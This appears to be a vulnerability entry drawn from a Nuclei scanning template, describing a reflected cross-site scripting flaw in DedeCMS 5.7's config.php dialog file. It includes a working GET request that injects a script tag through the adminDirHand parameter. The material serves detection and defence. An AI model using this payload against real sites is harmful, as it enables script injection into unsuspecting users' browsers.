# Vulnerability: DedeCMS 5.7 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`dedecms-config-xss.yaml`)

## Description
DeDeCMS 5.7 contains a cross-site scripting vulnerability in the '/include/dialog/config.php' file. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

